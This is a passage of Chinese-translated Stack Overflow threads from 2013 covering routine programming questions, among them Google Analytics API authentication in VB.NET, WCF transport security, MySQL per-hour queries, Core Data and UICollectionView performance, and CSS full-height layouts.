`request.Fetch()`我的问题是，当我点击此方法时，我在“发送直接消息或获取响应时发生错误”行出现异常。内部异常说：“远程服务器返回错误：（400）错误请求。”

这个错误显然很模糊。根据[Google 的错误代码文档](https://developers.google.com/analytics/devguides/reporting/core/v3/coreErrors)， 400 Bad Request 表明输入参数在某种程度上没有意义。任何人都可以通过查看我的代码中的参数来诊断问题吗？否则，我怎么会开始追查我做错了什么？错误中几乎没有任何信息。

（至少我已经通过了身份验证阶段......我*认为*。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-14T16:26:47.087

[从这个答案](https://stackoverflow.com/a/13013265/371228)中大量借用，我想出的解决方案是：

```
Imports System.Security.Cryptography.X509Certificates
Imports Google.Apis.Analytics.v3
Imports Google.Apis.Analytics.v3.Data
Imports Google.Apis.Authentication.OAuth2
Imports Google.Apis.Authentication.OAuth2.DotNetOpenAuth
Imports System.Security.Cryptography

Public Class GoogleAnalytics

    Private _profileId As String
    Private _service As AnalyticsService

    ''' <summary>
    ''' Creates an instance of the Google Analytics interface
    ''' </summary>
    ''' <param name="profileId">The Google Analytics profile ID, in the form "ga:123456789". This is *not* the same as the ID number used in the GA JavaScript to initialize the tracking! The number you want is in Google Analytics > Admin > (your profile) > Profile Settings.</param>
    ''' <param name="serviceAccountId">The e-mail address of the Service Account that will access the API. These accounts can be generated from the Google API Console and then authorized by adding the e-mail address to the list of authorized users in Google Analytics.</param>
    ''' <param name="privateKeyPath">The path to the private-key (.p12) file from Google.</param>
    ''' <param name="certificatePassword">The password for the private key. Probably "notasecret".</param>
    ''' <remarks>Once created, this GoogleAnalytics object can be used to make an arbitrary number of requests.</remarks>
    Public Sub New(profileId As String, serviceAccountId As String, privateKeyPath As String, certificatePassword As String)
        Dim cert As X509Certificate2 = New X509Certificate2(privateKeyPath, certificatePassword, X509KeyStorageFlags.Exportable Or X509KeyStorageFlags.MachineKeySet)
        Dim client As AssertionFlowClient = New AssertionFlowClient(GoogleAuthenticationServer.Description, cert) With {.Scope = "https://www.googleapis.com/auth/analytics.readonly",
                                                                                                                        .ServiceAccountId = serviceAccountId}
        Dim authenticator As OAuth2Authenticator(Of AssertionFlowClient) = New OAuth2Authenticator(Of AssertionFlowClient)(client, AddressOf AssertionFlowClient.GetState)
        _service = New AnalyticsService(authenticator)

        _profileId = profileId
    End Sub

    Public Function GetData(startDate As String, endDate As String, metrics As String, dimensions As String, Optional filters As String = Nothing) As GaData
        Dim request As DataResource.GaResource.GetRequest = _service.Data.Ga.Get(_profileId, startDate, endDate, metrics)
        request.Dimensions = dimensions

        If filters IsNot Nothing Then
            request.Filters = filters
        End If

        Return request.Fetch()
    End Function

End Class 
```

这是一个独立的类，可以按如下方式使用：

```
Dim analytics As New GoogleAnalytics("ga:12345678", "123456789012@developer.gserviceaccount.com", "C:\privatekey.p12", "notasecret")
Dim data as GaData = analytics.GetData(DateTime.Now.AddDays(-30).ToString("yyyy-MM-dd"),
                                       DateTime.Now.AddDays(-1).ToString("yyyy-MM-dd"),
                                       "ga:totalEvents",
                                       "ga:eventCategory,ga:eventAction") 
```

我发现的最大问题是个人资料 ID。这*不是*您传递给 Google 的 Javascript 跟踪代码的 ID 号；相反，它是您在 Google Analytics（分析）> 管理员 >（您的个人资料）> 个人资料设置中找到的数字。希望这对其他人有帮助！

# javascript - Onmouseover 和 onmouseout 在 IE 中不起作用

> ID：15163656
> 
> 赞同：1
> 
> 时间：2013-03-01T17:39:08.973
> 
> 标签：javascript, onmouseover, onmouseout

我对 onmouseover 和 onmouseout 事件有疑问。我正在我的网站上处理它：http: [//pacogames.com/](http://pacogames.com/)当您通过 Chrome 或 FF 访问它并将鼠标移到游戏上时，您可以看到游戏的视频，但是当您通过 IE 访问它时，只有当您将鼠标悬停在空白区域时才会播放视频。当您的鼠标在图像上时，您看不到视频。（我的意思是 div.BOXRIGHT 中的游戏）。

这是示例的代码：

```
<li id="videobox-1" class="videobox">
  <a href="url_game" id="OdkazVideo1"> 
    <div id="video1">
    </div>
    <div style="display:block; position: absolute; top: 5px; width: 163px; height: 182px; z-index: 90;" onmouseover="PrehrajVideo(1, 'game_video.swf')" onmouseout="ZastavVideo(1)">
    </div> 
  </a>         
  <a href="url_game">   
   <img class="BOXGAMES_IMG" src="image_game.png" alt="play name_game" style="position: relative; z-index: 1;" /><br />game_name
</a> 
    <span style="width: 100px; height: 22px; float:left; padding: 5px 30px 0 30px;">'.$game['rating'].'</span>
    <p class="BOXGAMES_PLAYS">200 Plays </p>   
</li>'; 
```

和JS函数

```
function PrehrajVideo (id, video) {   

  var params = {
      'wmode': 'transparent',
      'quality': 'high',
      'mute': '1'
  }
  swfobject.embedSWF(video, "video"+id, "163", "123", "7", false, "", params, "" ); 
}

function ZastavVideo (id) { 
  swfobject.removeSWF("video"+id);
  $('#OdkazVideo'+id).prepend("<div id='video"+id+"'></div>");
} 
```

谁能帮我解决这个问题？非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:50:01.400

对 IE 使用 onMouseLeave 事件。这将解决问题。

# wcf - 如果 IIS 设置为协商证书，我是否需要为 wcf 配置传输安全性？

> ID：15163668
> 
> 赞同：0
> 
> 时间：2013-03-01T17:39:33.140
> 
> 标签：wcf, iis, ssl-certificate

即使所有可用的文档都指导我如何配置 WCF 以允许通过 SSL 的证书，我仍然很难辨别 IIS 的职责所在以及 WCF 的职责所在。

例如，我对我的 IIS 服务器没有权限。我要求管理员设置我的虚拟目录（应用程序）以通过 ssl 要求证书。我这样做是因为当我尝试通过 web.config 配置此安全性时，它告诉我 IIS 未设置为允许这样做。

之后，另一位开发人员告诉我，由于 IIS 管理员是这样设置的，我只需在 web.config 中将 security = none 和 client auth 设置为 none，因为 IIS 现在将为我的应用程序处理这个问题。

这是真的？此外，是否有文档解释配置 IIS 和 WCF 的选项以及显示这些身份验证过程发生位置的某种类型的管道？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-05T18:58:49.377

好吧，您肯定需要安装证书并在 IIS 中启用 SSL 绑定，然后才能正常工作。您还必须将“Security”模式设置为“Transport”，并将“clientCredentialType”设置为“None”。这可能是您的开发人员朋友的意思，尽管如果在 IIS 中设置了安全性，他暗示 WCF 不需要做任何事情是错误的。

```
<bindings>
  <basicHttpBinding>
    <binding name="secureHttpBinding">
      <security mode="Transport">
        <transport clientCredentialType="None"/>
      </security>
    </binding>
  </basicHttpBinding>
</bindings> 
```

然后，您将在服务端点配置中引用此绑定。[这个页面](http://msdn.microsoft.com/en-us/library/hh556232.aspx)有一个非常清晰的分步指南，虽然您显然需要访问 IIS 来设置它。

基本思想是证书由 IIS 安装和管理，IIS 也处理身份验证。WCF 所做的只是说明服务将使用/期望的安全类型。[此页面](http://msdn.microsoft.com/en-us/library/ms734679.aspx)对 HTTP 上的传输安全性进行了很好的讨论，以及为此设置 IIS 的链接。希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T18:49:44.510

我最近为外部公司设置了 wcf 服务来访问我们的数据。安全实践很难配置。我最终绕过了证书并编写了一个自定义身份验证类，该类对标头中的用户名和密码进行身份验证。我在旅途中找到的有用参考资料。

[http://wcfsecurityguide.codeplex.com/releases/view/15892](http://wcfsecurityguide.codeplex.com/releases/view/15892)

[http://msdn.microsoft.com/en-us/library/aa702565.aspx](http://msdn.microsoft.com/en-us/library/aa702565.aspx)

我希望我能给你更多我的情况对安全来说不是那么重要，所以这在我采取的路线中起着重要作用。

# asp.net - Request.Url 有错误的端口信息

> ID：15163670
> 
> 赞同：1
> 
> 时间：2013-03-01T17:39:39.923
> 
> 标签：asp.net, http, azure, port, nancy

我的 Web 应用程序使用 Nancy，并托管在 Azure 中的 Asp.Net 中。
在开发中，我使用 IIS Express 和 Azure 的 Compute Emulator。

在生产中，主页`http://mydomain/test`
在我的机器上的调试中打开，主页在`http://127.0.0.1:81/test`
但是，在我的 NancyModule 中，我得到：

```
Request.Url == http://127.0.0.1:82/test 
```

为什么是82？也许它与 IIS Express 显示其网站有关`http://127.255.0.0:82/`？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-03-01T18:15:42.040

82 是 IIS 为应用程序提供服务的端口。你想用它做点什么吗？

# mysql - MySQL - 如何选择具有给定日期每小时最小（时间戳）的行

> ID：15163674
> 
> 赞同：3
> 
> 时间：2013-03-01T17:39:42.950
> 
> 标签：mysql, timestamp, min, hour

我有一个生产读数表，需要获取一个结果集，其中包含每个小时的 min(timestamp) 行。列布局很简单：ID,TIMESTAMP,SOURCE_ID,SOURCE_VALUE

数据样本如下所示：

123,'2013-03-01 06:05:24',PMPROD,12345678.99
124,'2013-03-01 06:15:17',PMPROD,88888888.99
125,'2013-03-01 06:25:24' ,PMPROD,33333333.33
126,'2013-03-01 06:38:14',PMPROD,44444444.44
127,'2013-03-01 07:12:04',PMPROD,55555555.55
128,'2013-03-01 10: 38:14',PMPROD,44444444.44
129,'2013-03-01 10:56:14',PMPROD,22222222.22
130,'2013-03-01 15:28:02',PMPROD,66666666.66

记录全天添加到此表中，并且 source_value 已计算，因此不需要总和。

我不知道如何为current_date的*每个小时获取 min(timestamp) 的一行。*

```
select *
from source_readings
use index(ID_And_Time)
where source_id = 'PMPROD'
and   date(timestamp)=CURRENT_DATE
and   timestamp =
        ( select min(timestamp) 
            from source_readings use index(ID_And_Time)
            where source_id = 'PMPROD'
        ) 
```

当然，上面的代码给了我一个记录。我需要一条记录 current_date 的 min(hour(timestamp))。

我的结果集应该包含 ID 的行：123,127,128,130。我已经玩了几个小时了。谁能成为我的英雄？:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:44:53.557

试试下面：

```
SELECT * FROM source_readings 
JOIN 
(
   SELECT ID, DATE_FORMAT(timestamp, '%Y-%m-%d %H') as current_hour,MIN(timestamp) 
   FROM source_readings 
   WHERE source_id = 'PMPROD'
   GROUP BY current_hour
) As reading_min
ON source_readings.ID = reading_min.ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T18:02:42.413

```
SELECT  a.*
FROM    Table1 a
        INNER JOIN
        (
            SELECT  DATE(TIMESTAMP) date, 
                    HOUR(TIMESTAMP) hour,
                    MIN(TIMESTAMP) min_date
            FROM    Table1
            GROUP   BY DATE(TIMESTAMP), HOUR(TIMESTAMP)
        ) b ON DATE(a.TIMESTAMP) = b.date AND
                HOUR(a.TIMESTAMP) = b.hour AND
                a.timestamp = b.min_date 
```

*   [SQLFiddle 演示](http://www.sqlfiddle.com/#!2/91109/1)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-09-23T12:13:22.730

带窗口功能：

```
WITH ranked (
  SELECT *, ROW_NUMBER() OVER(PARTITION BY HOUR(timestamp) ORDER BY timestamp) rn
  FROM source_readings -- original table
  WHERE date(timestamp)=CURRENT_DATE AND source_id = 'PMPROD' -- your custom filter
)
SELECT * -- this will contain `rn` column. you can select only necessary columns
FROM ranked
WHERE rn=1 
```

我没有测试过，但基本的想法是：

1)`ROW_NUMBER() OVER(PARTITION BY HOUR(timestamp) ORDER BY timestamp)`

这将为每一行提供一个数字，从每小时 1 开始，按时间戳递增。结果可能如下所示：

```
|rest of columns                            |rn
123,'2013-03-01 06:05:24',PMPROD,12345678.99,1
124,'2013-03-01 06:15:17',PMPROD,88888888.99,2
125,'2013-03-01 06:25:24',PMPROD,33333333.33,3
126,'2013-03-01 06:38:14',PMPROD,44444444.44,4
127,'2013-03-01 07:12:04',PMPROD,55555555.55,1
128,'2013-03-01 10:38:14',PMPROD,44444444.44,1
129,'2013-03-01 10:56:14',PMPROD,22222222.22,2
130,'2013-03-01 15:28:02',PMPROD,66666666.66,1 
```

2）然后在主查询中，我们只选择具有 的行`rn=1`，换句话说，在每个小时分区中具有最低时间戳的行（每小时按时间戳排序后的第一行）。

# ios - 优化 NSFetchedResultsController 抓取

> ID：15163678
> 
> 赞同：0
> 
> 时间：2013-03-01T17:39:54.437
> 
> 标签：ios, objective-c, core-data

我有一个 NSFetchedResultsController 和存储在核心数据中的大量数据，获取的结果控制器必须获取这些数据。它最终将获取大约 46,000 件物品。问题是获取时间超过 8 秒，并且整个时间，UI 都被冻结，因为我们必须在主线程上获取。我想知道是否有什么办法可以加快速度？

我按对象的创建日期对对象进行排序，获取请求的批量大小为 100，谓词并不过分复杂。它按对象的 UID、类型和所有者的 UID 过滤对象。

由于用户可以搜索，因此 fetch 谓词会发生变化，因此在 fetched results 控制器上设置缓存似乎毫无意义，因为每次 fetch 谓词更改时它都会被删除。

它与 Core Data 中的对象数量直接相关，因为切换到具有较少对象的帐户会显着减少获取时间。（6000 个对象需要不到一秒的时间）。有什么办法可以让这个更具可扩展性？我的代码如下：

```
- (NSFetchRequest *)getFetchRequest
{
    NSFetchRequest *fetchRequest = [NSFetchRequest requestWithEntityName:@"Photo"];
    NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"date" ascending:NO];
    [fetchRequest setSortDescriptors:[NSArray arrayWithObject:sortDescriptor]];
    [sortDescriptor release];
    [fetchRequest setPredicate:[self getFetchPredicates]];
    [fetchRequest setFetchBatchSize:100];
    return fetchRequest;
}

- (NSPredicate *)getFetchPredicates {
    NSMutableArray *predicates = [NSMutableArray arrayWithObjects:
                                  [NSPredicate predicateWithFormat:@"life_uid == %@",[[LoginManager shared] currentLifeUID]],
                                  [NSPredicate predicateWithFormat:@"(type == %@) OR (type == %@)", TLTypeImage, TLTypeVideo],
                                  [NSPredicate predicateWithFormat:@"(ANY stories.permission.owner_person_uid == %@ OR stories.@count == 0)", [[LoginManager shared] currentPersonUID]],
                                  nil];
    NSArray *filteredMomentIDs = [[self searchTerms] objectForKey:TLLibraryViewControllerSearchTermsPhotoIDsKey];
    if ([filteredMomentIDs count] > 0 && [self searchMode] == kTLLibrarySearchModeTag)
    {
        [predicates addObject:[NSPredicate predicateWithFormat:@"uid in %@", filteredIDs]];
    }
    return [NSCompoundPredicate andPredicateWithSubpredicates:predicates];
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-02T00:18:39.430

由于您（在评论中）解释所有属性都是字符串，因此您可能很难改善这种情况。您在该 fetch 中进行了**大量**字符串比较——前两个谓词的 46k 记录乘以至少 3，再加上更多取决于`stories`平均有多少关系。这是您的性能问题的主要原因 - 进行如此多的字符串比较将成为瓶颈。

有几件事可能会有所帮助：

*   在您正在查看的第三个谓词中`@"(ANY stories.permission.owner_person_uid == %@ OR stories.@count == 0)"`。谓词从左到右进行评估。数值比较比字符串比较快，所以`@count`先检查。如果它是真的，那么后半部分不需要评估，你会跳过很多字符串比较。
*   从左到右的事情也适用于您的`NSPredicate`实例的顺序。您可能对数据的外观有所了解——确保**最严格**的谓词（即最大数量的对象*不会*通过的谓词）是列表中的第一个谓词。然后是第二个最严格的，等等。由于您将谓词和-ing 在一起，一个实例失败了第一个谓词将不需要与其他谓词进行检查。尽早过滤掉谓词链中的对象。

可能最简单的收获是通过更改第三个谓词中的顺序，然后将其移动到列表的前面。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T00:31:48.700

我想如果这对性能真的很重要，你总是可以对你的数据模型进行一些反规范化。您可以将 owner_person_uid 属性的副本添加到 stories 对象中。这样谓词就不必遍历这么多关系。

如果您更改其中一个属性，此解决方案将要求您始终更新相关对象。

# ios - MPMoviePlayerViewController 没有搜索栏

> ID：15163682
> 
> 赞同：1
> 
> 时间：2013-03-01T17:40:03.840
> 
> 标签：ios, objective-c, cocoa-touch, streaming

我的 MPMoviePlayerViewController 没有启用搜索栏或快进按钮。它只显示 --:--，就像您流式传输时一样。我的代码如下所示：

```
MPMoviePlayerViewController *player = [[MPMoviePlayerViewController alloc] initWithContentURL:[NSURL URLWithString:[NSString stringWithFormat:@"http://REMOVED/listen.php?id=%@&token=%@", curid, token]]];
[[player moviePlayer] setRepeatMode:MPMovieRepeatModeNone];
[[player moviePlayer] setAllowsAirPlay:true];
[[player moviePlayer] ];
[[player moviePlayer] setMovieSourceType:MPMovieSourceTypeStreaming];
[self presentMoviePlayerViewControllerAnimated:player]; 
```

文件头如下所示：

```
Connection:keep-alive
Content-Length:4012742
Content-Transfer-Encoding:binary
Content-Type:audio/mpeg
Date:Fri, 01 Mar 2013 17:28:57 GMT
Server:nginx admin
X-Powered-By:PHP/5.4.12 
```

为什么不启用搜索栏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T18:11:37.480

尝试：

```
[[player moviePlayer] setControlStyle:MPMovieControlModeDefault]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T20:51:30.690

终于让它工作了。它是 php 中的“Content-range”标头，它丢失并导致搜索被禁用。

# facebook - 没有创建应用程序按钮

> ID：15163692
> 
> 赞同：0
> 
> 时间：2013-03-01T17:40:25.950
> 
> 标签：facebook, developer-tools

我昨天注册为开发人员并且能够创建/删除应用程序。但是大约一个小时后，当我尝试在developers.facebook.com/apps 上创建一个新应用程序时，我没有在右上角看到“创建新应用程序”按钮。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T21:21:26.933

我遇到了同样的问题，在另一篇文章中找到了答案，希望对您有所帮助。[http://developers.facebook.com/setup](http://developers.facebook.com/setup)

# ios - 使用 UIImage 和 UILabels 创建 UICollectionViewCell 会导致滚动缓慢

> ID：15163693
> 
> 赞同：1
> 
> 时间：2013-03-01T17:40:32.453
> 
> 标签：ios, objective-c

我创建了一个带有 UIview（充当标题）、一个 UIImage 和 10 个 UILabel 的子视图。我将这些作为单元格放入 UICollectionView 中。

完全设计时，它不会平滑滚动。如果我删除所有 UILabel，它会平滑滚动。

我假设它很慢导致 UICollectionView 按需加载，所以当它需要每个新单元格时，它必须绘制它来锁定主线程。

仅仅是iOS无法处理创建它们的问题吗？如果是这样，还有其他方法可以将文本放入其中吗？

我的手机是什么样子的：

![在此处输入图像描述](../Images/33d62a5c6a25126364945e6c08a8d20f.png)

这是 DatasetFilterListPanelView，它创建了我放入 UICollectionViewCell 的 UIView。我这样做是因为我在决定使用 UICollectionView 之前创建了它。

```
@implementation DatasetFilterListPanelView

-(id)initWithFrame:(CGRect)frame {
    if (self = [super initWithFrame:frame]) {

        self.translatesAutoresizingMaskIntoConstraints = FALSE;

        UIView *contentView = [self createContentView];

        [self addSubview:contentView];

        [self addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|[contentView]|" options:0 metrics:nil views:NSDictionaryOfVariableBindings(contentView)]];
        [self addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:|[contentView]|" options:0 metrics:nil views:NSDictionaryOfVariableBindings(contentView)]];
    }

    return self;
}

-(UIView *) createContentView {
    UIView *contentView = [[UIView alloc] initWithFrame:self.frame];
//    contentView.translatesAutoresizingMaskIntoConstraints = FALSE;
    contentView.backgroundColor = [UIColor myDarkGrayColor];

    UIView *headerView = [self createHeaderView];

    [contentView addSubview:headerView];

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|[headerView]|" options:0 metrics:nil views:NSDictionaryOfVariableBindings(headerView)]];
    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:|[headerView]" options:0 metrics:nil views:NSDictionaryOfVariableBindings(headerView)]];

    UIImageView *imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"gear12.png"]];
    imageView.translatesAutoresizingMaskIntoConstraints = FALSE;
    imageView.backgroundColor = [UIColor blueColor];
    self.imageView = imageView;

    [imageView addConstraint:[NSLayoutConstraint constraintWithItem:imageView attribute:NSLayoutAttributeHeight relatedBy:NSLayoutRelationEqual toItem:imageView attribute:NSLayoutAttributeWidth multiplier:1 constant:0]];

    [contentView addSubview:imageView];

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[imageView]" options:0 metrics:nil views:NSDictionaryOfVariableBindings(imageView)]];
    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:[headerView]-[imageView]-|" options:0 metrics:nil views:NSDictionaryOfVariableBindings(headerView, imageView)]];

    UILabel *acresLabel = [self createLabelWithTitle:@"Label01:" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:12]];
    [contentView addSubview:acresLabel];

    UILabel *addedLabel = [self createLabelWithTitle:@"Label02:" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:12]];
    [contentView addSubview:addedLabel];

    UILabel *typeLabel = [self createLabelWithTitle:@"Label03:" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:12]];
    [contentView addSubview:typeLabel];

    UILabel *zonesLabel = [self createLabelWithTitle:@"Label04:" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:12]];
    [contentView addSubview:zonesLabel];

    UILabel *sceneLabel = [self createLabelWithTitle:@"Label05:" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:12]];
    [contentView addSubview:sceneLabel];

    UILabel *acresValueLabel = [self createLabelWithTitle:@"Data" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE size:12]];
    acresValueLabel.textAlignment = NSTextAlignmentLeft;
    [contentView addSubview:acresValueLabel];

    UILabel *addedValueLabel = [self createLabelWithTitle:@"Data" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE size:12]];
    addedValueLabel.textAlignment = NSTextAlignmentLeft;
    [contentView addSubview:addedValueLabel];

    UILabel *typeValueLabel = [self createLabelWithTitle:@"Name" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE size:12]];
    typeValueLabel.textAlignment = NSTextAlignmentLeft;
    [contentView addSubview:typeValueLabel];

    UILabel *zonesValueLabel = [self createLabelWithTitle:@"Data" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE size:12]];
    zonesValueLabel.textAlignment = NSTextAlignmentLeft;
    [contentView addSubview:zonesValueLabel];

    UILabel *sceneValueLabel = [self createLabelWithTitle:@"Name" andFont:[UIFont fontWithName:HELVETICA_FONT_STYLE size:12]];
    sceneValueLabel.textAlignment = NSTextAlignmentLeft;
    [contentView addSubview:sceneValueLabel];

    NSDictionary *views = NSDictionaryOfVariableBindings(headerView, imageView, acresLabel, acresValueLabel, addedLabel, addedValueLabel, typeLabel, typeValueLabel, zonesLabel, zonesValueLabel, sceneLabel, sceneValueLabel);

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:[headerView]-[acresLabel]"
                                                                        options:0
                                                                        metrics:nil
                                                                          views:views]] ;

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:[acresLabel]-[addedLabel(==acresLabel)]-[typeLabel(==acresLabel)]-[zonesLabel(==acresLabel)]-[sceneLabel(==acresLabel)]-|"
                                                                        options:NSLayoutFormatAlignAllRight
                                                                        metrics:0
                                                                          views:views]];

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:[acresValueLabel]-[addedValueLabel(==acresLabel)]-[typeValueLabel(==acresLabel)]-[zonesValueLabel(==acresLabel)]-[sceneValueLabel(==acresLabel)]-|"
                                                                        options:NSLayoutFormatAlignAllLeft
                                                                        metrics:nil
                                                                          views:views]];

    [contentView addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:[imageView]-20-[acresLabel]-[acresValueLabel]"  options:0  metrics:nil  views:views]];

    return contentView;
}

-(UIView *)createHeaderView {
    UIView *view = [UIView new];
    view.translatesAutoresizingMaskIntoConstraints = FALSE;
    view.backgroundColor = [UIColor blueColor];
    view.clipsToBounds = YES;

    [view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"V:[view(30)]" options:0 metrics:nil views:NSDictionaryOfVariableBindings(view)]];

    UILabel *title = [UILabel new];
    title.translatesAutoresizingMaskIntoConstraints = FALSE;
    title.text = @"Default text";
    title.font = [UIFont fontWithName:HELVETICA_FONT_STYLE_BOLD size:14];
    title.textColor = [UIColor whiteColor];
    title.backgroundColor = [UIColor clearColor];
    self.headerLabel = title;

    [view addSubview:title];

    [view addConstraints:[NSLayoutConstraint constraintsWithVisualFormat:@"H:|-[title]" options:0 metrics:nil views:NSDictionaryOfVariableBindings(title)]];
    [view addConstraint:[NSLayoutConstraint constraintWithItem:title attribute:NSLayoutAttributeCenterY relatedBy:NSLayoutRelationEqual toItem:view attribute:NSLayoutAttributeCenterY multiplier:1 constant:0]];

    self.headerGradient = [UIColor grayGradient];
    self.headerGradient.frame = CGRectMake(0, 0, 360, 30);

    [view.layer insertSublayer:self.headerGradient atIndex:0];

    return view;
}

-(UILabel *)createLabelWithTitle:(NSString *)title andFont:(UIFont *)font; {
    UILabel *label = [UILabel new];
    label.translatesAutoresizingMaskIntoConstraints = FALSE;
    label.text = title;
    label.font = font;
    label.textAlignment = NSTextAlignmentRight;
    label.textColor = [UIColor whiteColor];
    label.backgroundColor = [UIColor clearColor];

    return label;
} 
```

这是我的 UICollectionViewCell 文件，我只是`addSubview`一个 DatasetFilterListPanelView 。

```
@implementation DatasetViewCell

- (id)initWithFrame:(CGRect)frame
{
    self = [super initWithFrame:frame];
    if (self) {

        [self addSubview:[[DatasetFilterListPanelView alloc] initWithFrame:CGRectMake(0, 0, 360, 160)]];
    }
    return self;
} 
```

当我在 UIScrollview 中使用相同的面板时，一旦它们全部加载并定位，它将平滑滚动。所以它必须是 UICollectionView 的按需加载单元格。

我跟着[这个 UICollectionView 教程](http://skeuo.com/uicollectionview-custom-layout-tutorial)

编辑：创建单元格：

```
-(UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath {
    DatasetViewCell *datasetCell = [collectionView dequeueReusableCellWithReuseIdentifier:DatasetCellIdentifier forIndexPath:indexPath];

    return datasetCell;
} 
```

编辑 2：仪器跟踪：

![在此处输入图像描述](../Images/6e5e602e3b0c7df232ea1932bc43457e.png)

![在此处输入图像描述](../Images/7f2c38fb41200e7d4a060acbdb4908e6.png)

![在此处输入图像描述](../Images/32832a973da5fc161e33ec279985bd6d.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T22:50:03.303

好吧，在玩了很多之后，我发现了罪魁祸首：约束！CodaFI 是对的。我在小组中没有那么多限制，所以我认为这不是问题所在。

我创建了一个 nib 文件并删除了自动布局，它现在可以平滑滚动。

每日一课：约束的计算速度很慢！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T18:22:25.830

通常问题是您不重复使用这些单元格。确保您用于`dequeueReusableCellWithReuseIdentifier:forIndexPath:`重用现有单元格。

# spring-data-jpa - Spring Data JPA finder 动态字段作为 Map

> ID：15163698
> 
> 赞同：1
> 
> 时间：2013-03-01T17:40:55.720
> 
> 标签：spring-data-jpa, dynamic-finders

我的要求是域对象中的自定义字段很少。这些字段可能因客户而异。

我们正在使用 Spring Data JPA 来执行查找器。Spring data 隐式地为域的静态字段提供查找器，并且还可以处理对象图中字段的查找器。

我想知道是否有办法在自定义字段上查找数据？有人可以建议我实现相同的策略。下面是我的域类的示例。

公共类员工{

私有字符串名称；

私有字符串年龄；

私人地图客户字段；（可能因客户而异）

}

我正在考虑覆盖 QueryLookupStrategy 并在 PartTreeJpaQuery 行上创建我的 CustomJpaQuery 来实现它。有没有更好的方法？spring data jpa 是否提供了一种简单的机制来覆盖查询创建机制？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T22:12:07.087

如果您使用的是 hibernate（不确定其他 JPA 实现），您可以添加带有`@Query`如下注释的方法：

```
@Query("select e from Employee as e where e.customeFields[:key] = :value")
List<Employee> findSomeHow(@Param("key") String key, @Param("value") String value) 
```

# google-calendar-api - Google 日历中的其他日历

> ID：15163701
> 
> 赞同：0
> 
> 时间：2013-03-01T17:40:59.410
> 
> 标签：google-calendar-api

我是谷歌日历的新手，我从来没有登录过谷歌日历。日历有两种类别 1\. 我的日历 2\. 其他日历

在其他日历中它默认显示两个日历一个是印度假期，第二个是联系人的生日我可以将事件添加到这些日历中吗因为现在当我只选择印度假期并在该事件中创建事件时单击它显示日历作为我的默认日历，当我使用 api 并将日历 ID 指定为 en.indian#holiday@group.v.calendar.google.com 并指定参数时，它不会在该日历中创建事件，而是在我调用使用时在我的默认日历中创建事件日历api .我收到错误未找到。请任何人指定是否可以在其他日历类别中创建事件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T03:54:17.500

您确定您有权在该日历中写入内容吗？您可以通过转到[UI](http://calendar.google.com)并单击任何空槽来检查它，您将看到一个窗口，显示“什么”、“何时”和“日历”选项；打开“日历”选择框并尝试找到“印度假期”选项，如果你没有看到它，那么你不能写，这就是你不能通过 API 调用来做的原因

希望这会有所帮助，问候

# html - 容器/包装器如何 在复杂页面中全屏显示

> ID：15163707
> 
> 赞同：0
> 
> 时间：2013-03-01T17:41:21.573
> 
> 标签：html, fullscreen

当我尝试对具有多个内部 div 的容器进行适当的解决方案时，就会出现这个问题。这适用于正文中的简单 div

```
html, body {
height: 100%;
margin: 0;
}

    #wrapper {
        min-height: 100%; 
        height:100%; <!-- if IE -->
        width: 100%;
        min-width:100%;
        background-color:#990000;
    } 
```

——这不是本周的典型情况：由 html 书和 1/10 创建的 60 小时工作是可计费的，因为它不起作用：尽管遵循了这封信，但说明不起作用；他们什么也没说必须突出显示条目然后点击选项卡以使 id 出现在草稿窗口中！--

为什么这在更复杂的页面中不起作用，其中#wrapper 变为#container_toolbox，其中包含更多的 div。在 IE 和 Mozilla 中，右边总是有一个间隙。为什么？

```
html, body {
        height: 100%;
        margin: 0;
    }
   #container_toolbox   
    {
        min-height: 100%; 
        height:100%; <!-- if IE -->
        width: 100%;
        min-width:100%;
            background-color:#99000;
    } 
```

